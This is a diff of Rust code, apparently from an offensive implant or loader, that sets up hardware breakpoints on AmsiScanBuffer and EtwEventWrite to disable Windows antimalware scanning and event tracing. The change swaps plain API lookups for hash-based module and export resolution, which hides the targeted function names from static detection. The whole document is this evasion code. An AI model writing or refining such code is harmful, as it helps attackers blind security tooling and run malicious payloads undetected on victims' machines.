@@ -73,18 +73,18 @@ pub unsafe fn setup_hardware_breakpoints() {
 
     let mut configured = false;
 
-    let amsi = LoadLibraryA(string_crypt::enc_str!("amsi.dll").as_ptr() as _);
+    let amsi = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
     if !amsi.is_null() {
-        let addr = GetProcAddress(amsi, string_crypt::enc_str!("AmsiScanBuffer").as_ptr() as _);
+        let addr = pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER).unwrap_or(0) as *mut _;
         if !addr.is_null() {
             AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
             configured = true;
         }
     }
 
-    let ntdll = GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as _);
+    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
     if !ntdll.is_null() {
-        let addr = GetProcAddress(ntdll, string_crypt::enc_str!("EtwEventWrite").as_ptr() as _);
+        let addr = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE).unwrap_or(0) as *mut _;
         if !addr.is_null() {
             ETW_ADDR.store(addr as usize, Ordering::Relaxed);
             configured = true;
